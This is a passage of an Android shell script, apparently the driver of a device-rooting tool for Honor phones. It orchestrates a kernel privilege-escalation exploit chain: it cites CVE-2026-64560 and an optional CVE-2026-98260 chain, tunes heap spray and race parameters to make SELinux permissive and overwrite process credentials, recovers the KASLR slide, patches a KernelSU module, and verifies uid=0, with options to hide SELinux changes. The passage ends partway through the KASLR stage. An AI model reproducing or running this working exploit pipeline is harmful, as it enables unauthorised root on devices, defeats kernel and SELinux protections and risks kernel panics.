#!/system/bin/sh
# MagicRoot 1.0.4 64650 链路（honor_ubl 接入版）。
# 工作目录和成功日志由应用保留；Root 出口为本分支的 bfexec。
set -u
D=/data/local/tmp/magic
R=/data/local/tmp/honor-64650
MARK="$D/marks"
STAGE_LOG="$D/stage.log"
ORIGINAL_ENFORCE=$(getenforce 2>/dev/null || echo unknown)

# Root backend flavor (BakaSU / FinaSU / KernelSU / SukiSU / KernelSU-Next).
# The app writes $D/ksu_flavor and also passes MAGICROOT_KSU_FLAVOR; the
# package / userspace / LKM template mapping lives in kernel_profiles.sh.
KSU_FLAVOR=${MAGICROOT_KSU_FLAVOR:-$(cat "$D/ksu_flavor" 2>/dev/null | tr -d '\r\n')}
case "$KSU_FLAVOR" in
    resukisu|fina|kernelsu|sukisu|next) ;;
    official|bakasu) KSU_FLAVOR=resukisu ;;
    *) KSU_FLAVOR=kernelsu ;;
esac
export MAGICROOT_KSU_FLAVOR="$KSU_FLAVOR"
KSU_MANAGER_PKG=$(ksu_flavor_pkg "$KSU_FLAVOR" 2>/dev/null || echo me.weishu.kernelsu)
KSU_MANAGER_LABEL=$(ksu_flavor_label "$KSU_FLAVOR" 2>/dev/null || echo BakaSU)
KSU_KSud=$(ksu_flavor_ksud "$KSU_FLAVOR" 2>/dev/null || echo ksud)
EXPECT_KVER=$(ksu_flavor_kver "$KSU_FLAVOR" 2>/dev/null || echo 32680)
EXPECT_UAPI=$(ksu_flavor_uapi "$KSU_FLAVOR" 2>/dev/null || echo 5)
export MAGICROOT_KSU_MANAGER="$KSU_MANAGER_PKG"
export MAGICROOT_EXPECT_KVER="$EXPECT_KVER"
export MAGICROOT_EXPECT_UAPI="$EXPECT_UAPI"

mark() {
    mkdir -p "$D" 2>/dev/null || true
    _m="STAGE_MARK=$1 time=$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null) uptime=$(cut -d. -f1 /proc/uptime 2>/dev/null) boot_id=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)"
    echo "$_m"
    echo "$_m" >> "$STAGE_LOG" 2>/dev/null || true
    sync 2>/dev/null || true
}

KASLR_ONLY=${MAGICROOT_KASLR_ONLY:-0}
[ -f "$D/kaslr-only" ] && KASLR_ONLY=1
case "$KASLR_ONLY" in 1) ;; *) KASLR_ONLY=0 ;; esac
AB_EXPORT=0
[ -f "$D/ab-export" ] && AB_EXPORT=1

# Tuning presets.  Default is now reference (HyperBreak Enhanced's validated
# 6.18 values); the previous fast/fail-fast values remain available as
# $D/tuning-current.  The existing UI victim buttons remain user overrides.
#   $D/tuning-current   : MagicRoot fast/fail-fast values
#                         (16 perm victims / 160 attempts / 24 cred victims /
#                          260+320 cred attempts)
#   $D/tuning-reference : default tuned values
#                         (24 victims / 200-300 attempts / 12000 nfrag /
#                          10000 cred drain / 3500 min)
#   $D/tuning-alt       : legacy alternate values
#                         (16 victims / 180 perm attempts / 90+90 writer / 6000 nfrag)
#   $D/tuning-v42       : upstream CVE-2026-64560-public v42 evidence values
#                         (24 victims / 200+300 cred attempts / 12000 nfrag /
#                          10000 cred drain / 3500 min)
#   $D/tuning-legacy-v42: legacy v42 invocation values
#                         (16 victims / 160 permissive / 260+320 cred /
#                          6000 nfrag / 12000 drain / 4500 min)
# Environment overrides MAGICROOT_* always win over the preset.
TUNING=reference
[ -f "$D/tuning-current" ] && TUNING=current
[ -f "$D/tuning-reference" ] && TUNING=reference
[ -f "$D/tuning-v42" ] && TUNING=v42
[ -f "$D/tuning-legacy-v42" ] && TUNING=legacy-v42
[ -f "$D/tuning-alt" ] && TUNING=alt
[ -n "${MAGICROOT_TUNING:-}" ] && TUNING=$MAGICROOT_TUNING
case "$TUNING" in
    reference|v42)
        DEF_VICTIMS_PERMISSIVE=24; DEF_VICTIMS_FSUID=24; DEF_VICTIMS_CRED=24
        DEF_ATTEMPTS_PERMISSIVE=200; DEF_ATTEMPTS_FSUID=200
        DEF_ATTEMPTS_CRED1=200; DEF_ATTEMPTS_CRED2=300
        DEF_FRAG_PERMISSIVE=12000; DEF_DRAIN_PERMISSIVE=12000; DEF_MIN_PERMISSIVE=4500
        DEF_FRAG_CRED=12000; DEF_DRAIN_CRED1=10000; DEF_MIN_CRED1=3500
        DEF_DRAIN_CRED2=10000; DEF_MIN_CRED2=3500
        ;;
    legacy-v42)
        # legacy v42 invocation:
        #   t64560_v36 0 <addr> 160 400 16 6000 12000 4500
        #   t64560_v42 <cred> 260 320 400 16 6000 12000 4500
        DEF_VICTIMS_PERMISSIVE=16; DEF_VICTIMS_FSUID=16; DEF_VICTIMS_CRED=16
        DEF_ATTEMPTS_PERMISSIVE=160; DEF_ATTEMPTS_FSUID=160
        DEF_ATTEMPTS_CRED1=260; DEF_ATTEMPTS_CRED2=320
        DEF_FRAG_PERMISSIVE=6000; DEF_DRAIN_PERMISSIVE=12000; DEF_MIN_PERMISSIVE=4500
        DEF_FRAG_CRED=6000; DEF_DRAIN_CRED1=12000; DEF_MIN_CRED1=4500
        DEF_DRAIN_CRED2=12000; DEF_MIN_CRED2=4500
        ;;
    alt)
        DEF_VICTIMS_PERMISSIVE=16; DEF_VICTIMS_FSUID=16; DEF_VICTIMS_CRED=16
        DEF_ATTEMPTS_PERMISSIVE=180; DEF_ATTEMPTS_FSUID=180
        DEF_ATTEMPTS_CRED1=90; DEF_ATTEMPTS_CRED2=90
        DEF_FRAG_PERMISSIVE=6000; DEF_DRAIN_PERMISSIVE=12000; DEF_MIN_PERMISSIVE=4500
        DEF_FRAG_CRED=6000; DEF_DRAIN_CRED1=12000; DEF_MIN_CRED1=4500
        DEF_DRAIN_CRED2=12000; DEF_MIN_CRED2=4500
        ;;
    *)
        TUNING=current
        DEF_VICTIMS_PERMISSIVE=16; DEF_VICTIMS_FSUID=16; DEF_VICTIMS_CRED=24
        DEF_ATTEMPTS_PERMISSIVE=160; DEF_ATTEMPTS_FSUID=160
        DEF_ATTEMPTS_CRED1=260; DEF_ATTEMPTS_CRED2=320
        DEF_FRAG_PERMISSIVE=12000; DEF_DRAIN_PERMISSIVE=12000; DEF_MIN_PERMISSIVE=4500
        # Cred parameter decision (see docs/reference/cred-parameters.md):
        # 24 victims / 400 timers / 260+320 attempts / 12000 nfrag /
        # 10000 drain max / 4500 min drain.  6000 nfrag is the legacy reference's
        # 6.18 value; Enhanced documents that it roughly halves landing.
        DEF_FRAG_CRED=12000; DEF_DRAIN_CRED1=10000; DEF_MIN_CRED1=4500
        DEF_DRAIN_CRED2=10000; DEF_MIN_CRED2=4500
        ;;
esac

VICTIMS_PERMISSIVE=${MAGICROOT_VICTIMS_PERMISSIVE:-$DEF_VICTIMS_PERMISSIVE}
VICTIMS_FSUID=${MAGICROOT_VICTIMS_FSUID:-$DEF_VICTIMS_FSUID}
VICTIMS_CRED=${MAGICROOT_VICTIMS_CRED:-$DEF_VICTIMS_CRED}
case "$VICTIMS_PERMISSIVE" in 16|24|32) ;; *) VICTIMS_PERMISSIVE=$DEF_VICTIMS_PERMISSIVE ;; esac
case "$VICTIMS_FSUID" in 16|24|32) ;; *) VICTIMS_FSUID=$DEF_VICTIMS_FSUID ;; esac
case "$VICTIMS_CRED" in 8|12|16|24|32) ;; *) VICTIMS_CRED=$DEF_VICTIMS_CRED ;; esac
# fsuid=0 is mandatory for a usable KernelSU su path: sucompat opens
# /data/adb/ksud with ksu_cred->fsuid, so fsuid=2000 gives EACCES.
# The skip switch is a deliberately mutually-exclusive debug mode; it must
# never be combined with su_compat/su_overlay.
SKIP_FSUID=${MAGICROOT_SKIP_FSUID:-0}
case "$SKIP_FSUID" in 1) ;; *) SKIP_FSUID=0 ;; esac
SU_COMPAT=${MAGICROOT_SU_COMPAT:-1}
SU_OVERLAY=${MAGICROOT_SU_OVERLAY:-0}
ALLOW_SHELL=${MAGICROOT_ALLOW_SHELL:-1}
case "$ALLOW_SHELL" in 1) ;; *) ALLOW_SHELL=0 ;; esac
# KernelSU adb_root feature: upstream static-key default false.  The UI switch
# sets it after root_stage is running.  PMX v1.6 enables it unconditionally;
# MagicRoot keeps the KernelSU source default (off) and exposes a switch.
ADB_ROOT=${MAGICROOT_ADB_ROOT:-0}
case "$ADB_ROOT" in 1) ;; *) ADB_ROOT=0 ;; esac
# PMX v1.6-style su entry: kernel su_compat hooks + Termux wrapper patch.
# No real su file is installed.
SU_ENTRY=${MAGICROOT_SU_ENTRY:-1}
case "$SU_ENTRY" in 1) ;; *) SU_ENTRY=0 ;; esac
# Project defaults: both features are enabled; UI switches can override.
KERNEL_UMOUNT=${MAGICROOT_KERNEL_UMOUNT:-1}
case "$KERNEL_UMOUNT" in 1) ;; *) KERNEL_UMOUNT=0 ;; esac
SELINUX_HIDE=${MAGICROOT_SELINUX_HIDE:-1}
case "$SELINUX_HIDE" in 1) ;; *) SELINUX_HIDE=0 ;; esac
# allow_shell 默认开启（UI「allow shell」默认开，模块以 allow_shell=1 加载）。
# 默认 allow_shell=1；仍可用 UI 或 MAGICROOT_ALLOW_SHELL=0 关闭。
# bootstrap 仅作为旧开关保留。
BOOTSTRAP_SHELL=${MAGICROOT_BOOTSTRAP_ALLOW_SHELL:-0}
[ -f "$D/bootstrap_allow_shell" ] && BOOTSTRAP_SHELL=1
case "$BOOTSTRAP_SHELL" in 1) ;; *) BOOTSTRAP_SHELL=0 ;; esac
LOAD_ALLOW_SHELL=$ALLOW_SHELL
if [ "$ALLOW_SHELL" != "1" ] && [ "$BOOTSTRAP_SHELL" = "1" ]; then
    LOAD_ALLOW_SHELL=1
fi
export MAGICROOT_ALLOW_SHELL_UI="$ALLOW_SHELL"
export MAGICROOT_BOOTSTRAP_SHELL="$BOOTSTRAP_SHELL"
export MAGICROOT_KERNEL_UMOUNT="$KERNEL_UMOUNT"
export MAGICROOT_SELINUX_HIDE="$SELINUX_HIDE"
if [ "$SKIP_FSUID" = "1" ] && { [ "$SU_COMPAT" = "1" ] || [ "$SU_OVERLAY" = "1" ]; }; then
    echo "FAIL=fsuid_su_path_conflict"
    exit 9
fi
[ "$SKIP_FSUID" = "1" ] && echo "WARN=skip_fsuid_debug_mode_no_su"

ATTEMPTS_PERMISSIVE=${MAGICROOT_ATTEMPTS_PERMISSIVE:-$DEF_ATTEMPTS_PERMISSIVE}
ATTEMPTS_FSUID=${MAGICROOT_ATTEMPTS_FSUID:-$DEF_ATTEMPTS_FSUID}
ATTEMPTS_CRED1=${MAGICROOT_ATTEMPTS_CRED1:-$DEF_ATTEMPTS_CRED1}
ATTEMPTS_CRED2=${MAGICROOT_ATTEMPTS_CRED2:-$DEF_ATTEMPTS_CRED2}
FRAG_PERMISSIVE=${MAGICROOT_FRAG_PERMISSIVE:-$DEF_FRAG_PERMISSIVE}
DRAIN_PERMISSIVE=${MAGICROOT_DRAIN_PERMISSIVE:-$DEF_DRAIN_PERMISSIVE}
MIN_PERMISSIVE=${MAGICROOT_MIN_PERMISSIVE:-$DEF_MIN_PERMISSIVE}
FRAG_CRED=${MAGICROOT_FRAG_CRED:-$DEF_FRAG_CRED}
DRAIN_CRED1=${MAGICROOT_DRAIN_CRED1:-$DEF_DRAIN_CRED1}
MIN_CRED1=${MAGICROOT_MIN_CRED1:-$DEF_MIN_CRED1}
DRAIN_CRED2=${MAGICROOT_DRAIN_CRED2:-$DEF_DRAIN_CRED2}
MIN_CRED2=${MAGICROOT_MIN_CRED2:-$DEF_MIN_CRED2}
# timers per victim (legacy 400); capture loop count for grab.sh.
GRAB_LOOPS=${MAGICROOT_GRAB_LOOPS:-120}
for _v in ATTEMPTS_PERMISSIVE ATTEMPTS_FSUID ATTEMPTS_CRED1 ATTEMPTS_CRED2; do
    eval "_n=\$$_v"
    case "$_n" in ''|*[!0-9]*) eval "$_v=120" ;; esac
    [ "$_n" -ge 1 ] 2>/dev/null && [ "$_n" -le 20000 ] 2>/dev/null || eval "$_v=120"
done
for _v in FRAG_PERMISSIVE FRAG_CRED; do
    eval "_n=\$$_v"
    case "$_n" in ''|*[!0-9]*) eval "$_v=6000" ;; esac
    [ "$_n" -ge 100 ] 2>/dev/null && [ "$_n" -le 60000 ] 2>/dev/null || eval "$_v=6000"
done
for _v in DRAIN_PERMISSIVE DRAIN_CRED1 DRAIN_CRED2; do
    eval "_n=\$$_v"
    case "$_n" in ''|*[!0-9]*) eval "$_v=12000" ;; esac
    [ "$_n" -ge 1000 ] 2>/dev/null && [ "$_n" -le 60000 ] 2>/dev/null || eval "$_v=12000"
done
for _v in MIN_PERMISSIVE MIN_CRED1 MIN_CRED2; do
    eval "_n=\$$_v"
    case "$_n" in ''|*[!0-9]*) eval "$_v=3500" ;; esac
    [ "$_n" -ge 100 ] 2>/dev/null && [ "$_n" -le 60000 ] 2>/dev/null || eval "$_v=3500"
done
case "$GRAB_LOOPS" in ''|*[!0-9]*) GRAB_LOOPS=120 ;; esac
[ "$GRAB_LOOPS" -ge 1 ] 2>/dev/null && [ "$GRAB_LOOPS" -le 400 ] 2>/dev/null || GRAB_LOOPS=40
# 持久 ko 缓存只保留最近 KO_CACHE_MAX 个、KO_CACHE_DAYS 天内的文件（同 boot 加速，跨 boot 自动淘汰）。
KO_CACHE_MAX=${MAGICROOT_KO_CACHE_MAX:-6}
KO_CACHE_DAYS=${MAGICROOT_KO_CACHE_DAYS:-7}
case "$KO_CACHE_MAX" in ''|*[!0-9]*) KO_CACHE_MAX=6 ;; esac
case "$KO_CACHE_DAYS" in ''|*[!0-9]*) KO_CACHE_DAYS=7 ;; esac
[ "$KO_CACHE_MAX" -ge 1 ] 2>/dev/null || KO_CACHE_MAX=6
[ "$KO_CACHE_MAX" -le 32 ] 2>/dev/null || KO_CACHE_MAX=32
[ "$KO_CACHE_DAYS" -ge 1 ] 2>/dev/null || KO_CACHE_DAYS=7
[ "$KO_CACHE_DAYS" -le 365 ] 2>/dev/null || KO_CACHE_DAYS=365

echo "TUNING=$TUNING VICTIMS_PERMISSIVE=$VICTIMS_PERMISSIVE"
echo "VICTIMS_FSUID=$VICTIMS_FSUID"
echo "VICTIMS_CRED=$VICTIMS_CRED"
echo "SKIP_FSUID=$SKIP_FSUID"
echo "DRAIN_PERMISSIVE=$DRAIN_PERMISSIVE MIN_PERMISSIVE=$MIN_PERMISSIVE"
echo "GRAB_LOOPS=$GRAB_LOOPS"
echo "CRED_WAIT=helper futex-cred MODULE_WAIT=helper futex-live"
echo "CRED nfrag=$FRAG_CRED drain1=$DRAIN_CRED1 min1=$MIN_CRED1 drain2=$DRAIN_CRED2 min2=$MIN_CRED2"
echo "ATTEMPTS_PERMISSIVE=$ATTEMPTS_PERMISSIVE ATTEMPTS_CRED=$ATTEMPTS_CRED1/$ATTEMPTS_CRED2"
mkdir -p "$D" "$MARK" "$R" 2>/dev/null || true
chmod 777 "$D" "$MARK" "$R" 2>/dev/null || true
echo "MARK_DIR=$MARK"
cd "$D" || exit 1
chmod 755 "$D"/kaslr_slide_61258 "$D"/kaslr_slide_6138 "$D"/ko_patch \
    "$D"/addrcalc "$D"/t64560_v36 "$D"/cred_target \
    "$D"/t64560_cred "$D"/wait_helper "$D"/bfexec "$D"/forker 2>/dev/null
# Removed scheme: the P0-safe binaries caused device reboots.  Delete stale
# copies from previous deployments so they can never be selected again.
rm -f "$D"/t64560_v36_safe "$D"/t64560_cred_safe 2>/dev/null || true
chmod 755 "$D"/grab.sh "$D"/grab_legacy.sh "$D"/run.sh "$D"/root_stage.sh \
    "$D"/clean.sh "$D"/su_optional.sh "$D"/su_entry.sh "$D"/su_path_compat.sh \
    "$D"/kernel_profiles.sh 2>/dev/null

# ---------------------------------------------------------------------------
# Preflight: the CVE-2026-64560 permissive race sprays/races kernel heap memory.
# Running it while Android is still booting (high load, little free memory) has a
# much higher panic/reboot rate, so wait until the device has settled.
#   MAGICROOT_BOOT_SETTLE_SEC  (default 60)
#   MAGICROOT_PREFLIGHT_MAX_LOAD (default 12)
#   MAGICROOT_PREFLIGHT_MIN_MEM_KB (default 800 MB)
#   MAGICROOT_PREFLIGHT_MAX_WAIT (default 180 s)
#   $D/skip-preflight or MAGICROOT_SKIP_PREFLIGHT=1 bypasses the wait.
#   MAGICROOT_PREFLIGHT_ONLY=1 stops after the check (diagnostics).
# ---------------------------------------------------------------------------
PREFLIGHT_SETTLE=${MAGICROOT_BOOT_SETTLE_SEC:-120}
PREFLIGHT_MAX_LOAD=${MAGICROOT_PREFLIGHT_MAX_LOAD:-20}
PREFLIGHT_MIN_MEM_KB=${MAGICROOT_PREFLIGHT_MIN_MEM_KB:-1048576}
PREFLIGHT_MAX_WAIT=${MAGICROOT_PREFLIGHT_MAX_WAIT:-240}
case "$PREFLIGHT_SETTLE" in ''|*[!0-9]*) PREFLIGHT_SETTLE=120 ;; esac
case "$PREFLIGHT_MAX_LOAD" in ''|*[!0-9]*) PREFLIGHT_MAX_LOAD=20 ;; esac
case "$PREFLIGHT_MIN_MEM_KB" in ''|*[!0-9]*) PREFLIGHT_MIN_MEM_KB=1048576 ;; esac
case "$PREFLIGHT_MAX_WAIT" in ''|*[!0-9]*) PREFLIGHT_MAX_WAIT=240 ;; esac
preflight() {
    if [ -f "$D/skip-preflight" ] || [ "${MAGICROOT_SKIP_PREFLIGHT:-0}" = "1" ]; then
        echo "PREFLIGHT_SKIP=1"
        return 0
    fi
    _i=0
    while :; do
        _up=$(cut -d. -f1 /proc/uptime 2>/dev/null || echo 0)
        _load=$(cut -d' ' -f1 /proc/loadavg 2>/dev/null | cut -d. -f1)
        [ -n "$_load" ] || _load=0
        _mem=$(awk '/^MemAvailable:/ {print int($2)}' /proc/meminfo 2>/dev/null)
        [ -n "$_mem" ] || _mem=0
        _bootc=$(getprop sys.boot_completed 2>/dev/null | tr -d '\r\n')
        if [ "$_up" -ge "$PREFLIGHT_SETTLE" ] && [ "$_bootc" = "1" ] &&
           [ "$_load" -le "$PREFLIGHT_MAX_LOAD" ] && [ "$_mem" -ge "$PREFLIGHT_MIN_MEM_KB" ]; then
            echo "PREFLIGHT_OK uptime=${_up}s load=${_load} mem_avail_kb=${_mem} settle=${PREFLIGHT_SETTLE} max_load=${PREFLIGHT_MAX_LOAD}"
            return 0
        fi
        if [ "$_i" -ge "$PREFLIGHT_MAX_WAIT" ]; then
            echo "FAIL=preflight_timeout uptime=${_up}s load=${_load} mem_avail_kb=${_mem} boot_completed=${_bootc}"
            echo "HINT=the device is still busy after boot; wait 1-2 minutes and retry (the permissive race is restart-prone on a busy boot)"
            echo "HINT_SKIP=touch $D/skip-preflight (or MAGICROOT_SKIP_PREFLIGHT=1) to bypass this safety wait"
            return 1
        fi
        if [ $((_i % 10)) -eq 0 ]; then
            echo "PREFLIGHT_WAIT uptime=${_up}s load=${_load} mem_avail_kb=${_mem} wait=${_i}/${PREFLIGHT_MAX_WAIT}s"
        fi
        sleep 1
        _i=$((_i + 1))
    done
}
preflight || exit 2
if [ "${MAGICROOT_PREFLIGHT_ONLY:-0}" = "1" ]; then
    echo "PREFLIGHT_ONLY_OK"
    exit 0
fi

# ---------------------------------------------------------------------------
# Optional second chain: CVE-2026-98260 (Honor 6.12.58 / 6.12.38 adapted builds).
# Opt-in only.  The default CVE-2026-64560 pipeline below is unchanged.
#   MAGICROOT_CHAIN=64560 (default) | 98260
#   MAGICROOT_ENABLE_98260=1 is required for 98260 (set by the app only after
#   the user explicitly selects the experimental chain and confirms).
# The 98260 chain has its own stage machine and never touches the 64560
# KASLR/ko_patch/permissive/cred/KernelSU assets or /data/adb.
# ---------------------------------------------------------------------------
:

CHAIN=${MAGICROOT_CHAIN:-64560}
case "$CHAIN" in
    64560|"")
        echo "CHAIN=64560"
        ;;
    98260)
        echo "CHAIN=98260"
        echo "CHAIN_64560_PIPELINE=skipped"
        mark CHAIN_98260_PRE
        if [ "${MAGICROOT_ENABLE_98260:-0}" != "1" ]; then
            echo "FAIL=chain_98260_not_enabled"
            echo "HINT=98260 is an experimental opt-in chain; select it in the app and confirm"
            exit 61
        fi
        if [ ! -f "$D/98260/run98260.sh" ]; then
            echo "FAIL=chain_98260_assets_missing dir=$D/98260"
            exit 62
        fi
        . "$D/kernel_profiles.sh"
        if ! select_chain_98260_profile "$(uname -r 2>/dev/null || echo unknown)"; then
            echo "FAIL=kernel_unsupported actual=$(uname -r 2>/dev/null || echo unknown) chain=98260 expected=$CHAIN_98260_KERNELS"
            exit 2
        fi
        echo "KERNEL_PROFILE=$PROFILE_ID PROFILE_CHAIN=$PROFILE_CHAIN"
        chmod 755 "$D"/98260/* "$D"/98260-6138/* 2>/dev/null || true
        sh "$D/98260/run98260.sh"
        CHAIN_RC=$?
        echo "CHAIN_98260_RC=$CHAIN_RC"
        if [ "$CHAIN_RC" = "0" ]; then
            if [ "${MAGICROOT_98260_PREFLIGHT:-0}" = "1" ]; then
                echo "CHAIN_98260_PREFLIGHT_OK=1"
                exit 0
            fi
            echo "CHAIN_98260_DONE"
            :
            echo "DONE"
            exit 0
        fi
        echo "FAIL=chain_98260 rc=$CHAIN_RC"
        # Preserve the chain-specific rc (76 parked / 77 boot changed / 80 proof / 81 preflight).
        case "$CHAIN_RC" in ''|*[!0-9]*) exit 63 ;; *) exit "$CHAIN_RC" ;; esac
        ;;
    *)
        echo "FAIL=chain_unknown chain=$CHAIN"
        exit 60
        ;;
esac

. "$D/kernel_profiles.sh"
ACTUAL_KERNEL=$(uname -r 2>/dev/null || echo unknown)
if ! select_kernel_profile "$ACTUAL_KERNEL"; then
    echo "FAIL=kernel_unsupported actual=$ACTUAL_KERNEL"
    exit 2
fi

KERNEL_PROFILE="$PROFILE_ID"
if [ "${MAGICROOT_FLAVOR_SYMS_MISSING:-0}" = "1" ] || [ "${FLAVOR_SYMS_MISSING:-0}" = "1" ]; then
    echo "FAIL=flavor_syms_unavailable profile=$KERNEL_PROFILE flavor=$KSU_FLAVOR"
    echo "HINT=no matching LKM/syms for this kernel KMI and backend (fail-closed; using another KMI's addresses would crash the module)"
    echo "HINT_SUPPORT=6.12.58: all five backends; 6.12.38: resukisu/kernelsu only until syms_6138_<flavor>.txt is generated"
    exit 2
fi
echo "KERNEL_ACTUAL=$ACTUAL_KERNEL"
echo "KERNEL_PROFILE=$KERNEL_PROFILE"
echo "PROFILE_READY=$PROFILE_READY"
echo "KASLR_BIN=$KASLR_BIN"
echo "SYMS=$SYMS"
echo "KO_TEMPLATE=$KO_TEMPLATE"
echo "V36_BIN=$V36_BIN"
echo "CRED_BIN=$CRED_BIN"
# Actual runtime uses the v42 two-phase cred writer (t64560_cred), not the
# P0-safe experiment.  The safe binaries caused device reboots and are no
# longer shipped or selected.
echo "CRED_SCHEME=v42"
echo "AB_EXPORT=$AB_EXPORT"
echo "ALLOW_SHELL=$ALLOW_SHELL ADB_ROOT=$ADB_ROOT SU_ENTRY=$SU_ENTRY"
echo "KERNEL_UMOUNT=$KERNEL_UMOUNT"
echo "SELINUX_HIDE=$SELINUX_HIDE"
echo "KASLR_ONLY=$KASLR_ONLY"
echo "KSU_FLAVOR=$KSU_FLAVOR"
echo "KSU_MANAGER=$KSU_MANAGER_PKG"
echo "KSU_EXPECT=version=$EXPECT_KVER uapi=$EXPECT_UAPI template=$KO_TEMPLATE syms=$SYMS compat=$KO_COMPAT"
echo "ALLOW_SHELL=$ALLOW_SHELL LOAD_ALLOW_SHELL=$LOAD_ALLOW_SHELL BOOTSTRAP_SHELL=$BOOTSTRAP_SHELL"
if [ "$LOAD_ALLOW_SHELL" != "1" ]; then
    echo "ALLOW_SHELL_NOTE=off (cold-boot root_stage needs an allowlisted shell; enable 「allow shell」 and reboot if grant fails)"
fi

KSU_FLAVOR=$(ksu_flavor_normalize "$KSU_FLAVOR")
KSU_MANAGER_PKG=$(ksu_flavor_pkg "$KSU_FLAVOR")
KSU_MANAGER_LABEL=$(ksu_flavor_label "$KSU_FLAVOR")
EXPECT_KVER=$(ksu_flavor_kver "$KSU_FLAVOR")
EXPECT_UAPI=$(ksu_flavor_uapi "$KSU_FLAVOR")
KSUD=""
KSU_MANAGER_APK=""
echo "KSU_USERSPACE=not_required root_channel=bfexec"
run_v36() {
    "$V36_BIN" "$@"
}
run_cred() {
    MAGICROOT_CAPBND_OK="$MARK/CAPBND_OK" MAGICROOT_PHASE2_MARKER="$MARK/PHASE2_DONE" MAGICROOT_VERIFY_PID="$TARGET_PID" \
        "$CRED_BIN" "$@"
}

# Reserved profiles only ship the matching .ko; they have no KASLR anchors or
# per-kernel syms yet. Fail closed instead of running the wrong layout.
if [ "$PROFILE_READY" != "1" ]; then
    echo "FAIL=profile_not_ready profile=$KERNEL_PROFILE"
    echo "TEMPLATE_PRESENT=$([ -f "$KO_TEMPLATE" ] && echo yes || echo no)"
    echo "REASON=missing_kaslr_and_syms"
    exit 2
fi

[ -f "$KASLR_BIN" ] || { echo "FAIL=missing_kaslr profile=$KERNEL_PROFILE"; exit 2; }
[ -f "$SYMS" ] || { echo "FAIL=missing_syms profile=$KERNEL_PROFILE"; exit 2; }
[ -f "$KO_TEMPLATE" ] || { echo "FAIL=missing_template profile=$KERNEL_PROFILE"; exit 2; }

# 清理旧版 Download/临时执行目录残留
rm -rf /data/local/tmp/.magicroot-exec 2>/dev/null
rm -rf "$D/honor" /data/local/tmp/root_stage.sh 2>/dev/null
echo "CAPBND_MARKER=$MARK/CAPBND_OK"
rm -f /data/local/tmp/bl_*.bin /data/local/tmp/bl_text.txt 2>/dev/null

# 上一次运行是否在竞态阶段中断（同一路径跨 boot 保留，用于诊断重启）
if [ -f "$MARK/PERMISSIVE_STARTED" ]; then
    echo "PREVIOUS_RUN_INCOMPLETE $(cat "$MARK/PERMISSIVE_STARTED" 2>/dev/null)"
    rm -f "$MARK/PERMISSIVE_STARTED" 2>/dev/null
fi

# 清理上一次中止留下的 helper / victim
pkill -9 -f '[c]red_target' 2>/dev/null
pkill -9 -f '[t]64560_v36' 2>/dev/null
pkill -9 -f '[t]64560_cred' 2>/dev/null
pkill -9 -f '[v]ictim-child' 2>/dev/null
sleep 1
mark RUN_CLEAN_DONE


rm -f "$D"/bl_*.bin "$D"/bl_text.txt 2>/dev/null
rm -f "$MARK"/PHASE2_DONE "$MARK"/CAPBND_OK "$MARK"/FINTI_TRY "$MARK"/FINTI_RC "$MARK"/FINTI_SKIP "$MARK"/ROOT_ID
rm -f "$D"/cred.log "$D"/finti.try "$D"/finti.rc "$D"/finti.skip "$D"/root_id
# Keep ksu-patched.ko for the ko_patch cache; a different boot/slide/inputs
# overwrites it. Removing it here would defeat the cache on every retry.

MODULE_ALREADY_LIVE_ENFORCING=0
if grep -Eq '^kernelsu .* Live' /proc/modules 2>/dev/null; then
    echo "== 0. reuse existing KernelSU =="
    mkdir -p "$R"
    cp "$D/bfexec" "$R/bfexec" && chmod 700 "$R" "$R/bfexec"
    if "$R/bfexec" > "$MARK/ROOT_ID" 2>&1 && grep -q 'uid=0' "$MARK/ROOT_ID"; then
        cat "$MARK/ROOT_ID"
        echo "MODULE_REUSED_BFEXEC_OK"
        echo "DONE"
        exit 0
    fi
    cat "$MARK/ROOT_ID" 2>/dev/null
    echo "FAIL=reuse_module_live_not_grantable"
    echo "HINT=restart the phone before retrying; do not run a second exploit chain in the same boot"
    exit 8
fi

# Permissive race bounds: successful landings observed at attempts 26..92.
# 120 attempts / 900 s prevents a 26-minute silent stall and still covers that
# range.  Override with MAGICROOT_PERMISSIVE_MAX_ATTEMPTS/TIMEOUT.
PERMISSIVE_MAX_ATTEMPTS=${MAGICROOT_PERMISSIVE_MAX_ATTEMPTS:-120}
case "$PERMISSIVE_MAX_ATTEMPTS" in ''|*[!0-9]*) PERMISSIVE_MAX_ATTEMPTS=120 ;; esac
[ "$PERMISSIVE_MAX_ATTEMPTS" -ge 20 ] 2>/dev/null || PERMISSIVE_MAX_ATTEMPTS=120
[ "$PERMISSIVE_MAX_ATTEMPTS" -le 500 ] 2>/dev/null || PERMISSIVE_MAX_ATTEMPTS=120
PERMISSIVE_TIMEOUT=${MAGICROOT_PERMISSIVE_TIMEOUT:-900}
case "$PERMISSIVE_TIMEOUT" in ''|*[!0-9]*) PERMISSIVE_TIMEOUT=900 ;; esac
[ "$PERMISSIVE_TIMEOUT" -ge 120 ] 2>/dev/null || PERMISSIVE_TIMEOUT=900
[ "$PERMISSIVE_TIMEOUT" -le 1800 ] 2>/dev/null || PERMISSIVE_TIMEOUT=900


mark KASLR_PRE
echo "== 1. KASLR =="
# KASLR slide is stable for the lifetime of one boot. Cache it keyed by
# boot_id so retries in the same boot do not repeat the trace grab.
BOOT_ID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || true)
KASLR_CACHE="$D/kaslr.cache"
KASLR_CACHE_HIT=0
if [ -n "$BOOT_ID" ] && [ -f "$KASLR_CACHE" ] &&
   [ "$(sed -n '1p' "$KASLR_CACHE" 2>/dev/null)" = "$BOOT_ID" ]; then
    sed -n '2,$p' "$KASLR_CACHE" > "$D/kaslr.txt" 2>/dev/null || true
    if grep -q '^KASLR_SLIDE=' "$D/kaslr.txt" 2>/dev/null &&
       grep -q '^SELINUX_ARG=' "$D/kaslr.txt" 2>/dev/null &&
       grep -q '^PREPARE=' "$D/kaslr.txt" 2>/dev/null &&
       grep -q '^KASLR_ANCHORS=' "$D/kaslr.txt" 2>/dev/null &&
       grep -q '^KASLR_VOTES=' "$D/kaslr.txt" 2>/dev/null &&
       grep -q '^KASLR_BYTES=' "$D/kaslr.txt" 2>/dev/null; then
        KASLR_CACHE_HIT=1
        echo "KASLR_CACHE_HIT boot_id=$BOOT_ID"
    fi
fi
KASLR_MIN_VOTES=${PROFILE_KASLR_MIN_VOTES:-3}
KASLR_MIN_ANCHORS=${PROFILE_KASLR_MIN_ANCHORS:-2}
KASLR_MIN_BYTES=${PROFILE_KASLR_MIN_BYTES:-1048576}
